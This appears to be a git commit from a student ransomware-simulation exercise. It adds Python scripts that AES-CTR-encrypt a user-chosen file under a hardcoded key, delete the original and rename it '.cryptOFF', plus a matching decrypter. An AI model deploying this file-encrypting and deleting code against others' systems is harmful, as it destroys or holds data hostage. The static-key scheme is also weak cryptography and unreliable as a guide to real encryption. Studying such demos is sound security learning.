9df0572c0befa1d367f7d78273c0c4424ffad0bc
Kaua <kauawt2@gmail.com>
2025-02-19 18:42:08 -0300

    Desafio - Criptografia Ataque Ransomware

---
+++ projeto-ransomware/decrypter.py
@@ -0,0 +1,34 @@
+import os
+import pyaes
+
+# Solicita o caminho do arquivo
+
+file_name = input("Digite o caminho do arquivo a ser descriptografado ").strip()
+
+file_name = file_name + ".cryptOFF"
+if not os.path.exists(file_name):
+    print("Erro: O arquivo específico não foi encontrado")
+else:
+    try:
+        # Abrir e ler o arquivo
+        with open(file_name, "rb") as file:
+            file_data = file.read()
+
+        # Chave de descriptografia com 32 bytes
+        key = b"testeransomwares_security_crypt!"
+
+        aes = pyaes.AESModeOfOperationCTR(key)
+        decrypt_data = aes.decrypt(file_data)
+
+        # Remover o arquivo criptografado
+        os.remove(file_name)
+
+        # Cria um novo nome removendo a extensão ".cryptOFF"
+        decrypted_file_name = file_name.replace(".cryptOFF", "")
+
+        # Salvando o arquivo descriptografado
+        with open(decrypted_file_name, "wb") as new_file:
+            new_file.write(decrypt_data)
+
+    except Exception as e:
+        print(f"Erro ao processar o arquivo: {e}")
---
+++ projeto-ransomware/encrypter.py
@@ -0,0 +1,33 @@
+import os
+import pyaes
+
+# Solicita o caminho do arquivo
+file_name = input("Digite o caminho do arquivo a ser criptografado ").strip()
+
+if not os.path.exists(file_name):
+    print("Erro: O arquivo específico não foi encontrado")
+
+else:
+    try:
+        # Abrir e ler o arquivo
+        with open(file_name, "rb") as file:
+            file_data = file.read()
+
+        # Remover o arquivo original
+        os.remove(file_name)
+
+        # Chave de criptografia com 32 bytes
+        key = b"testeransomwares_security_crypt!"
+
+        aes = pyaes.AESModeOfOperationCTR(key)
+
+        # Criptografar o arquivo
+        crypto_data = aes.encrypt(file_data)
+
+        # Salvando o arquivo criptografado
+        encrypted_file_name = file_name + ".cryptOFF"
+        with open(encrypted_file_name, "wb") as new_file:
+            new_file.write(crypto_data)
+
+    except Exception as e:
+        print(f"Erro ao processar o arquivo: {e}")
